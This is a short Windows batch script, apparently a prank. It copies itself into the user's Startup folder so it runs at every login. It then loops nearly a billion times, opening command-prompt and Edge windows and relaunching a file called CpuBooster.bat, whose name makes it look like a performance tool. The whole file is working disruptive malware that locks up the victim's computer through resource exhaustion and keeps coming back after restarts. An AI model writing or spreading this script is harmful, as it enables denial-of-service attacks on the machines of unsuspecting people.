@echo off
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
  copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
)
for /l %%x in (1,1,999999999) do (
    start "" "cmd.exe" >nul 2>&1
    start "" "Msedge.exe" >nul 2&1
    echo Get pranked lol
    start "New Window" CpuBooster.bat
)
pause 
exit